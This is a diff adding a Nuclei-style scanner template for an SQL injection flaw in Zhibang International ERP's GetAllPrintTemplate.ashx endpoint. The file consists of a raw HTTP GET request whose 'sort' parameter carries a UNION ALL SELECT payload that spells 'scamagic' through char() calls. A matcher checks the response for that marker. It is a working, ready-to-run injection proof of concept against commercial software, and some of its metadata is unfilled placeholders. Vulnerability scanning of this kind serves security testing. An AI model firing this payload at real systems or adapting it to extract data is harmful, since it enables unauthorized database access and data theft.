@@ -1,0 +1,24 @@
+id: zhibangERP-GetAllPrintTemplate-sqli
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 智邦国际-GetAllPrintTemplate-SQL注入漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        GET /SYSN/json/pcclient/GetAllPrintTemplate.ashx?sort=12+UNION+ALL+SELECT+NULL,NULL,char(115)%2Bchar(99)%2Bchar(97)%2Bchar(109)%2Bchar(97)%2Bchar(103)%2Bchar(105)%2Bchar(99),NULL-- HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate, br, zstd
+        Accept-Language: zh-CN,zh;q=0.9
+    matchers:
+      - type: word
+        part: body
+        words:
+          - scamagic
